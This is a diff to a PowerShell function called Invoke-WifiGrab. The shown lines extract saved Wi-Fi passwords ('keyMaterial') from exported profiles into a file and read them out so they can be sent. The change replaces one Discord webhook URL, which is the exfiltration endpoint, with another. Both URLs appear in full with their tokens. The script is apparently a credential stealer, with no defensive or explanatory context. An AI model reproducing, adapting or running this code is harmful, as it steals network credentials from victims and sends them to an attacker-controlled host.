@@ -9,7 +9,7 @@ function Invoke-WifiGrab {
     Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
 
     # Define the webhook URL
-    $webhookUrl = "https://discord.com/api/webhooks/1152928382728818688/oFmzbzZYFLMnpP_DUVDUGdfGUlikAHQGYj5paJAyshjGOSbGUZO38yubtSfYPv0fIXMq"
+    $webhookUrl = "https://discord.com/api/webhooks/1142817266640105592/-QJ9WtjaDql0VTdtva9RcAaLGyfN9bNYL0yDYiHBSaQsvau0di1-lI71t-slx6aVPNO6"
 
     # Read the extracted key materials from the file
     $keyMaterialContent = Get-Content -Path "Wi-Fi-PASS" -Raw
